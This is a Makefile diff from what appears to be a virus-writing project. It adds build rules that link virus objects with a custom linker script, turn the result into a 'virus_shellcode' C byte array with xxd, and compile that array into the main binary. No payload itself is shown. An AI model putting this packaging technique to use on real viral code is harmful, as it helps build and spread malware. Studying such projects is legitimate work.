@@ -12,6 +12,9 @@ BIN_DIR				= bin
 
 OBJ	=	$(addprefix $(OBJ_DIR)/, $(notdir $(SRC:.c=.o)))
 
+VIRUS = $(TMP_DIR)/virus.template
+VIRUS_X = $(TMP_DIR)/virus_shellcode.c
+
 VIRUS_WRAPPER_START = $(TMP_DIR)/virus_wrapper_start.o
 
 VIRUS_C = $(TMP_DIR)/virus.o
@@ -23,8 +26,16 @@ LD_RULES = $(BIN_DIR)/virus_linking.lds
 
 all: $(NAME)
 
-$(NAME): $(VIRUS_WRAPPER_START) $(VIRUS_C)
+$(NAME): $(OBJ) $(VIRUS)
+	$(COMPILER) $(FLAGS) -o $(NAME) $(OBJ) $(VIRUS_X)
+
+$(VIRUS_X): $(VIRUS)
+
+$(VIRUS): $(VIRUS_WRAPPER_START) $(VIRUS_C)
 	ld -o $@ -T $(LD_RULES) $(VIRUS_WRAPPER_START) $(VIRUS_C)
+	mv $(@) virus_shellcode
+	xxd -i virus_shellcode > $(VIRUS_X)
+	rm virus_shellcode
 
 $(VIRUS_WRAPPER_START): $(VIRUS_START) | $(TMP_DIR)
 	nasm -f elf64 $< -o $@
